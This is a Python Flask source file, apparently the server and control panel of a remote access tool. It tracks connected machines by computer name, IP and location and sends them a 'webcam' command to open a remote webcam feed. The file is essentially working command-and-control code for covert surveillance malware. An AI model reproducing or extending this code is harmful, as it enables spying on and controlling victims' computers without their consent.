from flask import *
import socket
import threading
import cv2
import struct
import pickle

IP = '127.0.0.1'
PORT = 12345


clients = []
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket = None
# server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

app = Flask(__name__)


@app.route('/getClients')
def get_data():
    return jsonify(clients)


@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template("index.html", clients=clients)


@app.route('/startServer', methods=['GET', 'POST'])
def startServer():
    if request.method == 'POST':
        start_thread = threading.Thread(target=start, args=())
        start_thread.start()
        return render_template("table.html", clients=clients)


@app.route('/stopServer', methods=['GET', 'POST'])
def stopServer():
    if request.method == 'POST':
        while True:
            try:
                server.shutdown(socket.SHUT_WR)
                buffer = server.recv(1024)
                if not buffer:
                    break
            except:
                break
        server.close()
        return render_template("index.html")


@app.route('/webcam', methods=['GET', 'POST'])
def control():
    if request.method == 'GET':
        message = 'webcam'
        client_socket.send(message.encode())
        #webcam = threading.Thread(target=get_webcam_video, args=())
        #webcam.start()
        return render_template("webcamDisplay.html")

# Fonction pour gérer les connexions des clients


def handle_client(client_socket, client_address):
    indexAddClient = 0
    clientComputerName = ''
    clientIp = client_address[0]
    clientLocation = ''
    print(
        f'Nouvelle connexion de {client_address[0]}:{client_address[1]} index: ')

    # Boucle pour recevoir les données envoyées par le client
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        try:
            print(f'{client_address[0]}:{client_address[1]} - {data.decode()}')

            # check if the received data is the computer name of the client
            if "computerName:" in data.decode():
                clientComputerName = data.decode().replace('computerName:', '')

            # check if the received data is the location of the client
            if "location:" in data.decode():
                clientLocation = data.decode().replace('location:', '')
                clients.append((client_address[1], clientComputerName, clientIp, clientLocation))
        except:
            print("data can't by show in terminal")

        print(clients)

    # Fermeture de la connexion avec le client
    client_socket.close()
    clients.remove(
        (client_address[1], clientComputerName, clientIp, clientLocation))
    print(f'Connexion avec {client_address[0]}:{client_address[1]} fermée')


def start():
    try:
        server.bind((IP, PORT))
        server.listen()
        print('Listening on localhost:12345...')
    except:
        print("server already listen...")
    while True:
        global client_socket
        client_socket, client_address = server.accept()
        # Création d'un thread pour gérer la connexion avec le client
        client_thread = threading.Thread(
            target=handle_client, args=(client_socket, client_address))
        client_thread.start()


if __name__ == "__main__":
    app.run(port=8000, debug=True)
